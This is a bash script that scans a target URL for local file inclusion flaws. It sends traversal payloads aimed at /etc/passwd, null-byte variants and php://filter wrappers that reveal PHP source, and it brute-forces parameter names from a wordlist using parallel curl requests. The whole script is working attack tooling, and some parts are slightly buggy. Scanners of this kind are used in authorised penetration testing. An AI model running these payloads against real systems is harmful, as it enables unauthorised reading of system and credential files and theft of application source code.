#!/bin/bash

URL=$1
WORDLIST=$2

length_blackList=("")
code_blackList=("")

lfi_filename=$(echo $URL | tr '/' ' '  | tr  '?&' ' ' | grep -o '\w*\.php' | tail -n 1)
lfi_filename_noex=$(echo $URL | tr '/' ' '  | tr  '?&' ' ' | grep -o '\w*\.php' | tail -n 1 | sed 's/.php//g')
isFuzz=false


lfi_attacks=(
    "../../../../../../../etc/passwd"
    "....//....//....//....//....//....//....//etc/passwd"
    "/etc/passwd"
    "../../../../////etc/////passwd/././"
    "../../../../../../../etc/passwd%00"
    "....//....//....//....//....//....//....//etc/passwd%00"
    "php://filter/convert.base64-encode/resource=${lfi_filename}"
    "php://filter/convert.base64-encode/resource=${lfi_filename_noex}"
    "php://filter/convert.iconv.utf-8.utf-16/resource=${lfi_filename}"
)


function blacklist_test(){

    for length in "${length_blackList[@]}"; do

        if [[ "$length" != "$2" ]]; then
            length_blackList+="$2"
        fi
    done

    for code in "${code_blackList[@]}"; do

        if [[ "$code" != "$1" ]] && [[ "$1" != "200" ]];then
            code_blackList+="$1"
        fi

    done
}


function test_request(){

    if [[ "${length_blackList[@]}" =~ "$2" ]] || [[ "${code_blackList[@]}" =~ "$1" ]]; then
        return 1
    else
        return 0
    fi
}


function force_to_fail(){
    fail_var="dsfgdssssssd.."
    replace_url=$(echo -e $URL | sed "s/FUZZ/$fail_var/g")
    http_get="$(curl -v -s -X GET $replace_url 2>&1 )"

    status_code=$( echo -e "$http_get" | grep 'HTTP/1.1' | tail -n 1 | awk '{print $3}')
    length=$( echo -e "$http_get" | grep 'Content-Length' | tail -n 1 | awk '{print $3}')

    blacklist_test $status_code $length
}


function brute_force_lfi(){


    for lfi_path in "${lfi_attacks[@]}"; do
  
        replace_param_url=$(echo -e $URL | sed "s/FUZZ/$replace/g") 2>/dev/null
        complete_url="${replace_param_url}${lfi_path}"

        request="$(curl -v -s -X GET $complete_url 2>&1 )"

        status_code=$( echo -e "$request" | grep 'HTTP/1.1' | tail -n 1 | awk '{print $3}')
        length=$( echo -e "$request" | grep 'Content-Length' | tail -n 1 | awk '{print $3}')
        

        test_request $status_code $length

        if [[ $? -eq 0 ]]; then
            echo -e "\t[*] LFI in: $complete_url"
        fi

    done
}

function no_brute_force_lfi(){

    for lfi_path in "${lfi_attacks[@]}"; do

        complete_url="${URL}${lfi_path}"
        request="$(curl -v -s -X GET "${complete_url}" 2>&1 )"

        status_code=$( echo -e "$request" | grep 'HTTP/1.1' | tail -n 1 | awk '{print $3}')
        length=$( echo -e "$request" | grep 'Content-Length' | tail -n 1 | awk '{print $3}')

        test_request $status_code $length

        if [[ $? -eq 0 ]]; then
            echo -e "\t[*] LFI in: $complete_url"
        fi

    done
}


## Function to test the specific php filename target as a lfi param (it must be executed after param bruteforce lfi)
function filename_as_param(){

    replace_param_url=$(echo -e $URL | sed "s/FUZZ/$lfi_filename_noex/g") 2>/dev/null

    max_processes=0

    for lfi_path in "${lfi_attacks[@]}"; do

        if [[ max_processes -ge 50 ]]; then
            max_processes=0
            wait
        fi

        max_processes=$(( $max_processes+1 ))
        (
            complete_url="${replace_param_url}${lfi_path}"
            request="$(curl -v -s -X GET "${complete_url}" 2>&1 )"
            status_code=$( echo -e "$request" | grep 'HTTP/1.1' | tail -n 1 | awk '{print $3}')
            length=$( echo -e "$request" | grep 'Content-Length' | tail -n 1 | awk '{print $3}')

            test_request $status_code $length

            if [[ $? -eq 0 ]]; then
                echo -e "\t[*] LFI in: $complete_url"
            fi
        )&
    done
}



force_to_fail


echo -e "$URL" | grep 'FUZZ' &>/dev/null

if [[ $? -eq 0 ]];then
    isFuzz=true
fi

if [[ $isFuzz ]] && [[ -f $WORDLIST ]]; then

    echo -e "\n[+] Executing brute force LFI\n"

    filename_as_param

    max_processes=0

   ( for FUZZ in $(cat $WORDLIST); do

        if [[ $max_processes -ge 20 ]]; then
            max_processes=0
            wait
            sleep 0.5
        fi
        max_processes=$(( $max_processes+1 ))

        (brute_force_lfi $FUZZ) &
    done
   ) 2>/dev/null


elif [[ $isFuzz == true ]] && [[ ! -f $WORDLIST ]];then

    echo "[!] If you use FUZZ you need a wordlists"

elif [[ $isFuzz == false ]];then

    echo -e "\n[+] Executing No brute force LFI\n"

    (no_brute_force_lfi) 2>/dev/null

fi



